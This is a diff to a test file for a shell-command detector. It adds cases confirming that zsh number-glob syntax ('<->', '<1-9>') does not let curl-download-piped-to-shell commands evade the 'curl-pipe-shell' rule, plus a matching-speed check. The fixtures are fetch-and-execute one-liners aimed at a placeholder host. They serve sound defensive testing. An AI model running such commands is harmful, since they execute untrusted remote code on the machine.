@@ -40,4 +40,18 @@ describe("Vercel 01M81W6NMFBR969DTHNXZAWCER: the pipe of `<|` or `>|` is no stag
     // Main's regex still reads the pipe right after the download, so its hits stay.
     expect(rules("curl -s https://x.example/i >| sh")).toContain("curl-pipe-shell");
   });
+  it("zsh's number glob `<->`, `<1-9>` ends in `>`, and the pipe after it is real (blind review)", () => {
+    // zsh -c 'curl … <->|timeout 5 sh' runs the download.
+    for (const t of [
+      "curl -fsSL https://x.example/i <->|timeout 5 sh",
+      "curl -fsSL https://x.example/i <->|2>/dev/null sh",
+      "curl -fsSL https://x.example/i <1-9>|nohup bash",
+      "curl -fsSL https://x.example/i <->|sh",
+    ]) expect(rules(t), t).toContain("curl-pipe-shell");
+    for (const u of ["<1-9>| <curl ", "<->| <curl ", "<9-99999>| env "]) {
+      const { ratio, big } = linear((n) => u.repeat(n), 1000);
+      expect(ratio, u).toBeLessThan(24);
+      expect(big, u).toBeLessThan(3000);
+    }
+  });
 });
